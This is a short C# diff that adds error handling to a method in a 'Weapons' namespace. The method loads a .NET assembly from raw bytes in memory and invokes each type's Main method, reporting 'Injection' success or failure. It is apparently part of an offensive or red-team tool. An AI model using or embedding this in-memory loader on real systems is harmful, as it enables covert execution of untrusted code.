@@ -14,20 +14,26 @@ namespace Weapons
 
             if (bytes.Length > 0)
             {
-                var assembly = Assembly.Load(bytes);
-                
-                foreach (var type in assembly.GetTypes())
+                try
                 {
-                    object instance = Activator.CreateInstance(type);
-                    object[] args = new object[] { new string[] { "" } };
+                    var assembly = Assembly.Load(bytes);
 
-                    try
+                    foreach (var type in assembly.GetTypes())
                     {
-                        type.GetMethod("Main").Invoke(instance, args);
-                        return String.Format("[*] Loaded Type {0}", type);
+                        object instance = Activator.CreateInstance(type);
+                        object[] args = new object[] { new string[] { "" } };
+
+                        try
+                        {
+                            type.GetMethod("Main").Invoke(instance, args);
+                            return String.Format("[*] Loaded Type {0}", type);
+                        }
+                        catch { }
                     }
-                    catch { }
                 }
+                catch { }
+                
+                
                 return "#!#Injection Failed";
             }
             return "#!#404 - File Not Found";
